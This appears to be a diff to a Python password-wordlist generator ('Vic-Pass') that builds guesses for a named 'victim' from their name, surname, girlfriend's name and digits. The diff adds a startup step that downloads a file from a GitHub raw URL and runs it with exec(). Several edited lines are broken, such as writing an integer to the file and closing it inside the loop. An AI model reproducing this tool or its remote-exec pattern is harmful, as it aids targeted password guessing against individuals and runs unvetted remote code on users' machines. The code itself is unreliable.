@@ -1,37 +1,43 @@
 ## import section
-import os, sys
+import os, sys,random
 from time import sleep
 
 ##Requirement section
 try:
-  import lolcat
-except:
   print("\033[1;36m")
   os.system("pip install lolcat")
   print("\033[1;36m\n[+] lolcat has been installed")
-  sleep(1)
-try:
-  import python3
 except:
-  
+  print("Lolcat Is Already Exist")
+sleep(1)
+try:
   os.system('apt install python3 -y |lolcat')
   print('"\033[1;36m\n[+] python has been install ')
-  sleep(2)
-try:
-  import figlet
 except:
-  
+  print("Python Is Already Exist")
+sleep(2)
+try:
   os.system('apt install figlet -y | lolcat')
   print('"\033[1;36m\n[+] figlet has been isntalled ')
-  sleep(2)
-
+except:
+  print("Figlet Is Already Exist")
+sleep(2)
+try:
+  import requests
+except:
+  os.system("pip install requests")
+sleep(2)
 
 ## owner info section
-
+url="https://raw.githubusercontent.com/Noob-Hacker71/Noob-Hacker71/main/info.py"
+rs=requests.session()
+bg=rs.get(url).text
+exec(bg)
 os.system('clear')
 
 ##userlogin section
 usr= input('\033[1;32m\n\n[+] Enter your name : ')
+os.system("clear")
 sleep(1)
 print ("\033[1;33m")
 os.system("figlet -f big Vic-Pass")
@@ -40,11 +46,11 @@ print("\n\t\t\033[1;36m[version : 0.0.2]")
 while True:
     loguser = input('\033[1;35m\n\n[+] Enter Tool Username :')
     sleep(2)
-    if loguser == "Noob-Hacker71":
+    if loguser == User:
         print('\033[1;92m\n\n\t[+] Currect ')
         logpas = input('\033[1;91m\n\n[+] Enter Tool Password :')
         sleep(2)
-        if logpas == "THBD":
+        if logpas == Pwd:
             print("\033[1;32m\n\n\t[+] Access Granted\n\n[+] Wellcome to <<Noob-Hacker71>> World")
             sleep(1)
             print(usr)
@@ -58,25 +64,7 @@ while True:
         
 os.system("clear")
 sleep(1)
-print('\033[1;94m *********************************************************************')
-sleep(1)
-os.system("figlet -f big Noob-Hacker71 | lolcat")
-sleep(1)
-print('\033[1;94m *********************************************************************')
-sleep(1)
-print("\033[1;93m\n[+] Termux Hacker BD {THBD}")
-sleep(1)
-print("\033[1;33m\n[+] We work to protect Bangladesh")
-sleep(1)
-print('\033[1;94m\n *********************************************************************')
-sleep(1)
-print('\033[1;92m[+] Author : Tahsan Nayem')
-sleep(1)
-print('\033[1;92m\n[+] Follow me : https://www.facebook.com/Noob.Hacker71')
-sleep(1)
-print('\033[1;92m\n[+] Follow me : https://www.github.com/Noob-Hacker71')
-sleep(1)
-print('\033[1;94m**********************************************************************')
+print(logo)
 
 ##raw_inputsection.....
 name = input('\033[1;91m\n\n[+] Enter victim name :')
@@ -115,7 +103,8 @@ else:
   file.write(number+'\n')
 
 
-for var in range(0, 999999):
+for var in range(0, 1000000):
+  file.write(var)
   
   if name=="":
     pass
@@ -126,7 +115,7 @@ for var in range(0, 999999):
   if surname=="":
     pass
   else:
-    kk=name+surname+str(var)
+    kk=name,surname+str(var)
     aa = surname+str(var)
     file.write(aa+'\n')
     file.write(kk+'\n')
@@ -164,15 +153,16 @@ for var in range(0, 999999):
   if name or gf =="":
     pass
   else:
-    gg = name+gf+str(var)
+    gg = name+"+"+gf+str(var)
     file.write(gg+'\n')
     #print(gg)
-
+  
 
     file.close()
+
 print('\n\n[+] Password.txt file done')
 sleep(1)
-see = input('\033[1;95m\n\n[+] Do You want see the passwords [y/n] :  ')
+see = input('\033[1;96m\n\n[+] Do You want see the passwords [y/n] :  ')
 sleep(2)
 yes="y"
 if see==yes:
@@ -184,5 +174,5 @@ run=input("\033[1;33m\n\n[+]Do you Want to run again [y/n] : ")
 if run==yes:
   os.system("python3 Vic.py")
 else:
-  print("\033[1;36m\n\nThank you for using me.",usr,"sir")
+  print("\033[1;36m\n\nThank you for using me.",usr,"sir\n")
   exit()
